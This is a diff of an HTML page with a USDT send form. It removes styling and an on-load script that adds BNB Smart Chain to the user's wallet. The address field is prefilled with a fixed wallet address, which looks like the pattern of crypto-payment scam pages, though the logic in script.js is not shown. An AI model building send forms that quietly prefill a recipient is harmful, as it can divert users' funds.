@@ -11,16 +11,16 @@
   <div class="container">
     <label for="address">Address or Domain Name</label>
     <div class="input-wrapper">
-      <input type="text" id="address" placeholder="Search or Enter" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999">
-      <span style="cursor:pointer" onclick="clearAddress()">✕</span>
-      <span style="color:#002fff; cursor:pointer" onclick="pasteAddress()">Paste</span>
+      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999">
+      <span onclick="clearAddress()">✕</span>
+      <span onclick="pasteAddress()">Paste</span>
     </div>
 
     <label for="amount">Amount</label>
     <div class="amount-wrapper">
       <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()"/>
       <span>USDT</span>
-      <span style="color:#002fff; cursor:pointer" onclick="fillMax()">Max</span>
+      <span onclick="fillMax()">Max</span>
     </div>
 
     <div class="amount-line" id="fiat">≈ $0.00</div>
@@ -29,29 +29,5 @@
   </div>
 
   <script src="script.js"></script>
-  <script>
-    // Ensure we're on BNB Smart Chain
-    async function switchToBSC() {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: '0x38',
-            chainName: 'BNB Smart Chain',
-            nativeCurrency: {
-              name: 'BNB',
-              symbol: 'BNB',
-              decimals: 18
-            },
-            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-            blockExplorerUrls: ['https://bscscan.com']
-          }]
-        });
-      } catch (err) {
-        // user rejected or already on chain
-      }
-    }
-    window.addEventListener('load', switchToBSC);
-  </script>
 </body>
 </html>
